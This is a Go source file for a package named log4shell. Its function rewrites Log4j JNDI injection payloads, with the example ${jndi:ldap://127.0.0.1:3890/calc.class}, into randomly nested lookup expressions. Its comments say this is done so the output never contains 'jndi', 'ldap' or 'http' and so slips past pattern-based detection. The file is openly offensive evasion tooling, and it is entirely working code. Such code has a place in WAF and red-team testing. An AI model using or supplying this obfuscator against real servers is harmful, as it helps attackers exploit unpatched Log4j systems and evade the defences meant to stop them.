package log4shell

import (
	"math/rand"
	"strings"
)

// TODO output generated string
// var obf string
//	flag.StringVar(&obf, "obf", "", "")
//	flag.Parse()
//
//	if obf != "" {
//		fmt.Println(log4shell.Obfuscate(obf))
//		os.Exit(0)
//	}

// raw: ${jndi:ldap://127.0.0.1:3890/calc.class}
//
// obfuscate rule:
// 1. ${xxx-xxx:any-code:-bc} => bc

// Obfuscate is used to obfuscate malicious(payload) string like
// ${jndi:ldap://127.0.0.1:3890/calc.class} for log4j2 package.
func Obfuscate(raw string) string {
	l := len(raw)
	if l < 3 {
		return ""
	}
	obfuscated := strings.Builder{}
	obfuscated.WriteString("${")

	remaining := len(raw) - len("${}")
	idx := 2
	// prevent not obfuscate twice, otherwise maybe
	// generate string like 1."jn" 2."di" -> "jndi"
	lastObfuscated := true

	for {
		// first select section length

		// use 0-3 is used to prevent include special
		// string like "jndi", "ldap" and "http"
		sl := rand.Intn(4)
		if sl > remaining {
			sl = remaining
		}
		section := raw[idx : idx+sl]

		if !randBool() && lastObfuscated {
			// not obfuscate
			obfuscated.WriteString(section)

			remaining -= sl
			if remaining <= 0 {
				break
			}
			idx += sl
			lastObfuscated = false
			continue
		}

		// generate useless data before section
		obfuscated.WriteString("${")
		n := 1 + rand.Intn(3) // 1-3
		for i := 0; i < n; i++ {
			front := randString(2 + rand.Intn(5))
			end := randString(2 + rand.Intn(5))

			obfuscated.WriteString(front)
			if randBool() {
				obfuscated.WriteString(":")
			} else {
				obfuscated.WriteString("-")
			}
			obfuscated.WriteString(end)
		}
		obfuscated.WriteString(":-")
		obfuscated.WriteString(section)
		obfuscated.WriteString("}")

		remaining -= sl
		if remaining <= 0 {
			break
		}
		idx += sl
		lastObfuscated = true
	}

	obfuscated.WriteString("}")
	return obfuscated.String()
}
